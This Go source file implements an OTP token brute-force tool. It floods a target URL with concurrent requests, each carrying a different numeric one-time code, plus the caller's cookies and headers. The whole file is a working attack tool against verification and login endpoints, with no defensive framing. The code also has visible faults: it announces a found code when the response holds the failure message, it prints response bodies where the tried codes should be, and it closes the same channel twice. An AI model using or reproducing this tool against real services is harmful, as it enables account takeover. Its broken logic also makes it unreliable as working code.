package main

import (
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/akamensky/argparse"
	"github.com/tomnomnom/rawhttp"
)

var (
	postURL              *string
	startNum             *int
	endNum               *int
	threads              *int
	cookies              *string
	headers              *[]string
	sleep                *int
	negativeSearchString *string
	requestContentType   *string
	httpVerb             *string
	postData             *string
)

func doRequest(code int) string {
	time.Sleep(time.Duration(*sleep) * time.Millisecond)

	// Create new RawHTTP request using Tomnomnom's rawhttp library
	req, err := rawhttp.FromURL(*httpVerb, *postURL)

	if err != nil {
		log.Println(err)
	}
	req.AutoSetHost()
	req.AddHeader(fmt.Sprintf("Content-Type: %s", *requestContentType))
	req.AddHeader(fmt.Sprintf("Cookie: %s", *cookies))
	data := strings.Replace(*postData, "__TOKEN__", fmt.Sprintf("%d", code), -1)
	req.Body = data
	for _, header := range *headers {
		parts := strings.Split(header, ":")
		req.AddHeader(fmt.Sprintf("%s: %s", parts[0], strings.Join(parts[1:], "")))
	}
	req.AutoSetContentLength()

	resp, err := rawhttp.Do(req)

	// Perform HTTP Post request
	if err != nil {
		log.Fatal(err)
	}

	// Read response body
	body := resp.Body()
	return string(body)
}

func doJob(wg *sync.WaitGroup, jobs chan int, results chan string) {
	defer wg.Done()
	for j := range jobs {
		results <- doRequest(j)
	}
}

func main() {
	parser := argparse.NewParser("go-token-brute", "A simple OTP token brute force tool")

	threads = parser.Int("t", "threads", &argparse.Options{
		Required: false,
		Help:     "Number of concurrent connections to use",
		Default:  10,
	})

	startNum = parser.Int("", "start-num", &argparse.Options{
		Required: false,
		Help:     "Token Start Number",
		Default:  1000,
	})

	endNum = parser.Int("", "end-num", &argparse.Options{
		Required: false,
		Help:     "Token End Number",
		Default:  9999,
	})

	postURL = parser.String("u", "url", &argparse.Options{
		Required: true,
		Help:     "The URL of the POST request",
	})

	cookies = parser.String("c", "cookies", &argparse.Options{
		Required: false,
		Help:     "The cookies to use",
	})

	headers = parser.StringList("e", "header", &argparse.Options{
		Required: false,
		Help:     "The headers to use",
	})

	sleep = parser.Int("s", "sleep", &argparse.Options{
		Required: false,
		Help:     "The number of milliseconds to sleep between requests",
		Default:  500,
	})

	requestContentType = parser.String("x", "content-type", &argparse.Options{
		Required: false,
		Help:     "The content type to use in the request",
		Default:  "application/json;charset=utf-8",
	})

	negativeSearchString = parser.String("n", "negative-search-string", &argparse.Options{
		Required: true,
		Help:     "The string to search for in the response body on a failed request (e.g. \"The provided token is invalid\")",
	})

	httpVerb = parser.String("v", "http-verb", &argparse.Options{
		Required: false,
		Help:     "The HTTP Verb to use",
		Default:  "POST",
	})

	postData = parser.String("d", "data", &argparse.Options{
		Required: true,
		Help:     "The HTTP request data to use; Note: Use __TOKEN__ to specify the token",
		Default:  "{}",
	})

	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		os.Exit(0)
	}

	var wg sync.WaitGroup
	jobs := make(chan int, 100)
	results := make(chan string, 100)

	go func() {
		wg.Wait()
	}()

	for j := 0; j < *threads; j++ {
		wg.Add(1)
		go doJob(&wg, jobs, results)
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := *startNum; i <= *endNum; i++ {
			jobs <- i
		}
	}()

	for res := range results {
		fmt.Println("Trying code: " + res)
		if strings.Contains(res, *negativeSearchString) {
			fmt.Println("[+] Code Found:", res)
			close(results)
			os.Exit(0)
		}
	}
	close(results)
}
